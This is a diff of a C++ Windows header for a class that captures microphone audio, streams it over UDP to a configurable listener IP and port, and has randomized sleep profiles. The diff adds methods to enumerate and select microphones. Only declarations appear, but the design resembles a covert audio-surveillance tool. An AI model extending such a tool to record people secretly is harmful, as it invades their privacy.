@@ -1,20 +1,10 @@
 #pragma once
-
-// 1. THIS MUST BE FIRST
 #define WIN32_LEAN_AND_MEAN 
-
-// 2. Standard Windows headers
 #include <windows.h>
-
-// 3. Networking headers
 #include <winsock2.h>
 #include <ws2tcpip.h>
-
-// 4. Multimedia headers
 #include <mmdeviceapi.h>
 #include <audioclient.h>
-
-// 5. C++ Standard Library
 #include <string>
 #include <vector>
 #include <thread>
@@ -22,8 +12,10 @@
 #include <random>
 #include <iostream>
 #include <algorithm>
-
-// Tell the linker to include the Winsock library
+#include <initguid.h>  
+#include <functiondiscoverykeys_devpkey.h>
+#include <comutil.h>
+#include <comdef.h>
 #pragma comment(lib, "ws2_32.lib")
 
 enum SleepProfile {
@@ -39,6 +31,7 @@ private:
 	SOCKET udpSocket = INVALID_SOCKET;
 	sockaddr_in serverAddr;
 	bool socketInitialized = false;
+	std::wstring targetDeviceId;
 
 public:
 	std::vector<char> globalAudioBuffer;
@@ -64,6 +57,9 @@ public:
 	void Start();
 	void Stop();
 	void SetSleepMode(int mode);
+	std::vector<std::wstring> GetMicrophones();
+	void ListMicrophones();
+	void SelectMicrophoneFromInt(int micIndex);
 	void RandomSleep();
 	void SetListener(std::string ip_address, int port);
 };
